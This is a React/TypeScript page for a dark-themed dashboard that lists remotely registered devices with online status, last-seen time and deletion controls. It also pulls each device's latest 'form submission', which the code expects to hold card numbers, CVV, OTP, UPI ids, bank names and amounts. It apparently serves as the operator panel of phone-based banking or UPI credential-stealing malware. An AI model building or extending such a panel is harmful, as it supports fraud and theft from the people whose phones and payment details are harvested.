// src/pages/DevicesPage.tsx
import { useEffect, useMemo, useState, type ReactNode } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";

import type { DeviceDoc } from "../types";
import { getDevices, deleteDevice } from "../services/api/devices";
import { getFavoritesMap, setFavorite } from "../services/api/favorites";
import { ENV, apiHeaders } from "../config/constants";
import ztLogo from "../assets/zt-logo.png";

// Using existing tech bg asset (swap later if you want)
import pageBg from "../assets/login-bg.png";

type Row = DeviceDoc & { _fav?: boolean };
type FormSubmission = Record<string, any>;

function safeStr(v: any): string {
  return String(v ?? "").trim();
}

function pickDeviceId(d: any): string {
  return safeStr(d?.deviceId || d?.uniqueid || d?.uniqueId || d?.uid || "");
}

function pickBrand(d: any): string {
  const meta = d?.metadata || {};
  return safeStr(meta.brand || meta.manufacturer || d?.brand || "Unknown Brand");
}

function pickModel(d: any): string {
  const meta = d?.metadata || {};
  return safeStr(meta.model || d?.model || "");
}

function pickLastSeenTs(d: any): number {
  const ts = d?.status?.timestamp;
  return typeof ts === "number" ? ts : 0;
}

function formatLastSeen(ts: number): string {
  if (!ts) return "-";
  try {
    return new Date(ts).toLocaleString();
  } catch {
    return "-";
  }
}

function pickFormDeviceId(s: FormSubmission): string {
  return safeStr(s?.uniqueid || s?.uniqueId || s?.deviceId || s?.device || s?.uid || "");
}

function pickFormTs(s: FormSubmission): number {
  const t1 = Number(s?.timestamp || s?.ts);
  if (Number.isFinite(t1) && t1 > 0) return t1;

  const created = safeStr(s?.createdAt || s?.created_at || s?.date || "");
  if (created) {
    const t = Date.parse(created);
    if (Number.isFinite(t)) return t;
  }
  return 0;
}

function maskMaybeSensitive(key: string, value: string): string {
  const k = key.toLowerCase();
  const digits = value.replace(/\D/g, "");
  const looksSensitive =
    k.includes("card") || k.includes("cvv") || k.includes("pan") || k.includes("account") || k.includes("acc");
  if (looksSensitive && digits.length >= 8) return `****${digits.slice(-4)}`;
  if (k.includes("otp") && digits.length >= 4) return "****";
  return value;
}

function summarizeForm(s: FormSubmission | null | undefined): string {
  if (!s || typeof s !== "object") return "No form submit";

  const candidates: Array<[string, any]> = [
    ["name", s.name || s.fullName],
    ["mobile", s.mobile || s.phone],
    ["amount", s.amount || s.amt],
    ["upi", s.upi || s.upiId],
    ["bank", s.bank || s.bankName],
    ["title", s.title || s.formTitle],
  ];

  const parts: string[] = [];
  for (const [k, raw] of candidates) {
    const v = safeStr(raw);
    if (!v) continue;
    parts.push(`${k}: ${maskMaybeSensitive(k, v)}`);
    if (parts.length >= 3) break;
  }

  const ts = pickFormTs(s);
  if (ts) parts.push(new Date(ts).toLocaleString());

  return parts.length ? parts.join(" • ") : "Form submitted";
}

function pickDeviceLogo(d: any): string {
  const meta = d?.metadata || {};
  const url = safeStr(meta.logoUrl || meta.logo || meta.iconUrl || meta.brandLogoUrl);
  if (url.startsWith("http://") || url.startsWith("https://") || url.startsWith("data:image/")) return url;
  return ztLogo;
}

function DeviceLogo({ src, alt }: { src: string; alt: string }) {
  const [broken, setBroken] = useState(false);

  if (broken) {
    return (
      <div className="w-11 h-11 rounded-2xl bg-white/10 border border-white/18 flex items-center justify-center text-sm font-bold text-white/80 backdrop-blur-xl">
        {alt.slice(0, 1).toUpperCase()}
      </div>
    );
  }

  return (
    <img
      src={src}
      alt={alt}
      className="w-11 h-11 rounded-2xl border border-white/18 object-cover bg-white/10 backdrop-blur-xl"
      onError={() => setBroken(true)}
      draggable={false}
    />
  );
}

function TechGlassCard({ children, className = "" }: { children: ReactNode; className?: string }) {
  return (
    // IMPORTANT: overflow-hidden clips glow so it doesn't create horizontal overflow/shake
    <div className={`relative overflow-hidden rounded-[26px] ${className}`}>
      {/* glow (kept inside card bounds) */}
      <div className="pointer-events-none absolute inset-0">
        <div className="absolute -inset-6 rounded-[34px] blur-3xl bg-cyan-400/14" />
      </div>

      {/* frame lines */}
      <div className="pointer-events-none absolute inset-0 rounded-[26px] border border-white/14" />
      <div className="pointer-events-none absolute inset-0 rounded-[26px] border border-cyan-200/10" />

      {/* corner accents */}
      <div className="pointer-events-none absolute left-3 top-3 h-6 w-6 border-l-2 border-t-2 border-cyan-200/50 rounded-tl-[10px]" />
      <div className="pointer-events-none absolute right-3 top-3 h-6 w-6 border-r-2 border-t-2 border-cyan-200/50 rounded-tr-[10px]" />
      <div className="pointer-events-none absolute left-3 bottom-3 h-6 w-6 border-l-2 border-b-2 border-cyan-200/50 rounded-bl-[10px]" />
      <div className="pointer-events-none absolute right-3 bottom-3 h-6 w-6 border-r-2 border-b-2 border-cyan-200/50 rounded-br-[10px]" />

      <div
        className={[
          "relative px-4 py-4",
          "bg-white/[0.055]",
          "border border-white/[0.16]",
          "backdrop-blur-3xl backdrop-saturate-[1.6]",
          "shadow-[0_30px_90px_rgba(0,0,0,0.58)]",
          "rounded-[26px]",
        ].join(" ")}
      >
        {/* glossy top highlight */}
        <div
          className="pointer-events-none absolute inset-0 rounded-[26px] opacity-70"
          style={{
            backgroundImage:
              "linear-gradient(to bottom, rgba(255,255,255,0.20), rgba(255,255,255,0.06) 22%, rgba(255,255,255,0.02) 45%, rgba(255,255,255,0.00) 70%)",
          }}
        />
        {/* scanlines */}
        <div
          className="pointer-events-none absolute inset-0 rounded-[26px] opacity-20"
          style={{
            backgroundImage:
              "repeating-linear-gradient(to bottom, rgba(255,255,255,0.05) 0px, rgba(255,255,255,0.05) 1px, transparent 1px, transparent 7px)",
          }}
        />
        <div className="relative">{children}</div>
      </div>
    </div>
  );
}

export default function DevicesPage() {
  const nav = useNavigate();

  const [devices, setDevices] = useState<Row[]>([]);
  const [favoritesMap, setFavoritesMap] = useState<Record<string, boolean>>({});
  const [latestFormMap, setLatestFormMap] = useState<Record<string, FormSubmission>>({});
  const [loading, setLoading] = useState(false);

  const [search, setSearch] = useState("");
  const [filter, setFilter] = useState<"all" | "online" | "offline" | "favorites">("all");
  const [error, setError] = useState<string | null>(null);
  const [refreshTick, setRefreshTick] = useState(0);

  async function loadFormsLatestByDevice(): Promise<Record<string, FormSubmission>> {
    try {
      const res = await axios.get(`${ENV.API_BASE}/api/form_submissions`, {
        headers: apiHeaders(),
        timeout: 12_000,
      });

      const list = Array.isArray(res.data) ? (res.data as FormSubmission[]) : [];
      const map: Record<string, FormSubmission> = {};

      for (const s of list) {
        const did = pickFormDeviceId(s);
        if (!did) continue;
        const ts = pickFormTs(s);
        const prev = map[did];
        if (!prev || ts > pickFormTs(prev)) map[did] = s;
      }
      return map;
    } catch {
      return {};
    }
  }

  async function loadAll() {
    setLoading(true);
    setError(null);

    try {
      const [list, favMap, formMap] = await Promise.all([getDevices(), getFavoritesMap(), loadFormsLatestByDevice()]);
      const safeFav = favMap || {};

      const normalized = (list || []).map((d: any) => {
        const id = pickDeviceId(d) || "unknown";
        return { ...d, deviceId: id, _fav: !!safeFav[id] } as Row;
      });

      // ✅ Show newly-added devices on top (assuming API returns older→newer)
      normalized.reverse();

      setFavoritesMap(safeFav);
      setLatestFormMap(formMap || {});
      setDevices(normalized);
    } catch (e) {
      console.error("loadAll failed", e);
      setError("Failed to load devices from server");
      setDevices([]);
      setLatestFormMap({});
    } finally {
      setLoading(false);
    }
  }

  useEffect(() => {
    loadAll();
    const id = setInterval(() => setRefreshTick((t) => t + 1), 12_000);
    return () => clearInterval(id);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    if (refreshTick > 0) loadAll().catch(() => {});
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [refreshTick]);

  const filtered = useMemo(() => {
    const q = search.trim().toLowerCase();

    return devices.filter((d) => {
      const did = safeStr(d.deviceId).toLowerCase();
      const brand = pickBrand(d).toLowerCase();
      const model = pickModel(d).toLowerCase();

      const online = !!d.status?.online;
      const fav = !!(favoritesMap[d.deviceId] ?? d.favorite ?? d._fav);

      if (filter === "online" && !online) return false;
      if (filter === "offline" && online) return false;
      if (filter === "favorites" && !fav) return false;

      if (!q) return true;
      return did.includes(q) || brand.includes(q) || model.includes(q);
    });
  }, [devices, favoritesMap, filter, search]);

  async function toggleFavorite(deviceId: string) {
    const curr = !!(favoritesMap[deviceId] ?? false);
    const next = !curr;

    try {
      await setFavorite(deviceId, next);
      setFavoritesMap((m) => ({ ...m, [deviceId]: next }));
      setDevices((prev) => prev.map((d) => (d.deviceId === deviceId ? { ...d, favorite: next, _fav: next } : d)));
    } catch (e) {
      console.error("toggleFavorite failed", e);
      setError("Failed to update favorite");
    }
  }

  async function handleDeleteDevice(deviceId: string) {
    if (!confirm(`Delete device ${deviceId}? This will remove it from DB.`)) return;

    try {
      await deleteDevice(deviceId);
      setDevices((prev) => prev.filter((d) => d.deviceId !== deviceId));
      setFavoritesMap((m) => {
        const copy = { ...m };
        delete copy[deviceId];
        return copy;
      });
      setLatestFormMap((m) => {
        const copy = { ...m };
        delete copy[deviceId];
        return copy;
      });
    } catch (e) {
      console.error("deleteDevice failed", e);
      setError("Failed to delete device");
    }
  }

  return (
    // app-like: full width + no horizontal shake
    <div className="relative w-full min-h-[100svh] overflow-x-hidden bg-black">
      {/* TECH BG (covers always) */}
      <div className="absolute inset-0 bg-center bg-cover" style={{ backgroundImage: `url(${pageBg})` }} />
      <div className="absolute inset-0 bg-gradient-to-b from-black/30 via-black/15 to-black/45" />
      <div className="absolute inset-0 shadow-[inset_0_0_240px_rgba(0,0,0,0.60)]" />

      {/* soft glow orbs */}
      <div className="pointer-events-none absolute inset-0 opacity-35">
        <div className="absolute -top-24 left-1/2 h-[460px] w-[460px] -translate-x-1/2 rounded-full blur-3xl bg-cyan-400/16" />
        <div className="absolute top-[35%] left-[-120px] h-[360px] w-[360px] rounded-full blur-3xl bg-blue-400/10" />
        <div className="absolute bottom-[-140px] right-[-140px] h-[420px] w-[420px] rounded-full blur-3xl bg-cyan-300/12" />
      </div>

      {/* CONTENT: full width in phone, centered on desktop */}
      <div className="relative w-full max-w-[420px] mx-auto px-3 pb-24 pt-4">
        <TechGlassCard>
          <div className="flex items-start justify-between gap-3">
            <div>
              <div className="text-[22px] font-extrabold tracking-tight text-white">Devices</div>
              <div className="text-[12px] text-white/60">Manage all registered devices</div>
            </div>

            <button
              onClick={() => loadAll()}
              className="h-10 px-4 rounded-2xl border border-white/14 bg-white/[0.06] text-white/85 backdrop-blur-2xl hover:bg-white/[0.09]"
              type="button"
              title="Refresh"
            >
              ↻
            </button>
          </div>

          {/* Search */}
          <div className="mt-4">
            <input
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              placeholder="Search brand / model / id"
              className={[
                "w-full h-11 rounded-2xl px-4 text-[14px]",
                "text-white placeholder:text-white/35",
                "bg-white/[0.06]",
                "border border-white/[0.14]",
                "backdrop-blur-2xl",
                "shadow-[inset_0_1px_0_rgba(255,255,255,0.10),_0_10px_30px_rgba(0,0,0,0.20)]",
                "outline-none",
                "focus:border-cyan-200/50 focus:ring-2 focus:ring-cyan-400/20",
              ].join(" ")}
            />
          </div>

          {/* results + filter */}
          <div className="mt-3 flex items-center justify-between gap-2">
            <div className="text-[12px] text-white/60">Results: {filtered.length}</div>
            <select
              value={filter}
              onChange={(e) => setFilter(e.target.value as any)}
              className={[
                "h-10 rounded-2xl px-3 text-[13px] font-semibold",
                "text-white/90",
                "bg-white/[0.06]",
                "border border-white/[0.14]",
                "backdrop-blur-2xl",
                "outline-none",
              ].join(" ")}
            >
              <option value="all">All</option>
              <option value="online">Online</option>
              <option value="offline">Offline</option>
              <option value="favorites">Favorites</option>
            </select>
          </div>

          {/* List */}
          <div className="mt-4 space-y-3">
            {loading && devices.length === 0 ? (
              <div className="rounded-3xl border border-white/14 bg-white/[0.05] backdrop-blur-2xl p-5 text-center text-white/70">
                Loading…
              </div>
            ) : filtered.length === 0 ? (
              <div className="rounded-3xl border border-white/14 bg-white/[0.05] backdrop-blur-2xl p-6 text-center text-white/60">
                No devices found.
              </div>
            ) : (
              filtered.map((d, idx) => {
                const online = !!d.status?.online;
                const fav = !!(favoritesMap[d.deviceId] ?? d.favorite ?? d._fav);

                const brand = pickBrand(d);
                const model = pickModel(d);
                const lastSeenTs = pickLastSeenTs(d);
                const lastForm = latestFormMap[d.deviceId] ? summarizeForm(latestFormMap[d.deviceId]) : "No form submit";
                const logoSrc = pickDeviceLogo(d);

                // Reverse count: newest at top gets the highest number
                const displayNumber = filtered.length - idx;

                return (
                  <div key={d.deviceId} className="relative">
                    <div className="absolute -inset-2 rounded-[28px] blur-2xl bg-cyan-400/10" />
                    <div
                      className={[
                        "relative rounded-[26px] p-4",
                        "border border-white/14",
                        "bg-white/[0.055]",
                        "backdrop-blur-3xl backdrop-saturate-[1.6]",
                        "shadow-[0_22px_70px_rgba(0,0,0,0.45)]",
                        "overflow-hidden",
                      ].join(" ")}
                    >
                      <div className="flex items-start justify-between gap-3">
                        <div className="flex items-center gap-3 min-w-0">
                          <DeviceLogo src={logoSrc} alt={brand} />
                          {/* Brand + inline number badge */}
                          <div className="min-w-0 flex flex-col">
                            <div className="flex items-center gap-2 min-w-0">
                              {/* Brand name (truncates when space is small) */}
                              <div className="font-extrabold text-[16px] text-white truncate min-w-0">{brand}</div>

                              {/* Inline number badge placed right after brand */}
                              <div
                                className="flex items-center justify-center w-7 h-7 rounded-full text-sm font-extrabold
                                           border border-white/14 bg-cyan-400/85 text-white shadow-[0_6px_18px_rgba(2,6,23,0.6)]
                                           flex-shrink-0"
                                title={`#${displayNumber}`}
                                aria-hidden={false}
                              >
                                {displayNumber}
                              </div>
                            </div>

                            <div className="text-[12px] text-white/60 truncate">
                              {model ? `${model} • ` : ""}
                              ID: {d.deviceId}
                            </div>
                          </div>
                        </div>

                        <div className="flex flex-col items-end gap-2 shrink-0">
                          <span
                            className={[
                              "px-3 py-1 rounded-full text-[12px] font-extrabold border",
                              online
                                ? "bg-green-500/15 text-green-200 border-green-400/25"
                                : "bg-red-500/15 text-red-200 border-red-400/25",
                            ].join(" ")}
                          >
                            {online ? "Online" : "Offline"}
                          </span>

                          <button
                            onClick={() => toggleFavorite(d.deviceId)}
                            className={[
                              "w-10 h-10 rounded-2xl border flex items-center justify-center text-lg",
                              "backdrop-blur-2xl",
                              fav
                                ? "bg-yellow-400/90 border-yellow-300 text-white shadow-[0_12px_35px_rgba(250,204,21,0.25)]"
                                : "bg-white/[0.06] border-white/16 text-white/55 hover:bg-white/[0.09]",
                            ].join(" ")}
                            type="button"
                            title={fav ? "Unfavorite" : "Favorite"}
                          >
                            ★
                          </button>
                        </div>
                      </div>

                      <div className="mt-4 grid grid-cols-2 gap-3">
                        <div className="rounded-2xl border border-white/12 bg-white/[0.04] backdrop-blur-2xl p-3">
                          <div className="text-[11px] text-white/55">Last seen</div>
                          <div className="mt-1 text-[13px] font-semibold text-white/90">{formatLastSeen(lastSeenTs)}</div>
                        </div>

                        <div className="rounded-2xl border border-white/12 bg-white/[0.04] backdrop-blur-2xl p-3">
                          <div className="text-[11px] text-white/55">Latest form</div>
                          <div className="mt-1 text-[13px] font-semibold text-white/85 line-clamp-2">{lastForm}</div>
                        </div>
                      </div>

                      <div className="mt-4 flex items-center gap-2">
                        <button
                          onClick={() => nav(`/devices/${encodeURIComponent(d.deviceId)}`)}
                          className={[
                            "flex-1 h-11 rounded-2xl text-[14px] font-extrabold",
                            "border border-white/14 bg-white/[0.06] text-white/90 backdrop-blur-2xl",
                            "hover:bg-white/[0.09] active:scale-[0.99]",
                          ].join(" ")}
                          type="button"
                        >
                          Open
                        </button>

                        <button
                          onClick={() => handleDeleteDevice(d.deviceId)}
                          className={[
                            "h-11 px-4 rounded-2xl text-[14px] font-extrabold",
                            "border border-red-400/25 bg-red-500/10 text-red-100 backdrop-blur-2xl",
                            "hover:bg-red-500/14 active:scale-[0.99]",
                          ].join(" ")}
                          type="button"
                        >
                          Delete
                        </button>
                      </div>
                    </div>
                  </div>
                );
              })
            )}
          </div>

          {error && (
            <div className="mt-4 rounded-2xl border border-red-400/25 bg-red-500/10 px-4 py-2 text-sm text-red-100">
              {error}
            </div>
          )}
        </TechGlassCard>
      </div>
    </div>
  );
}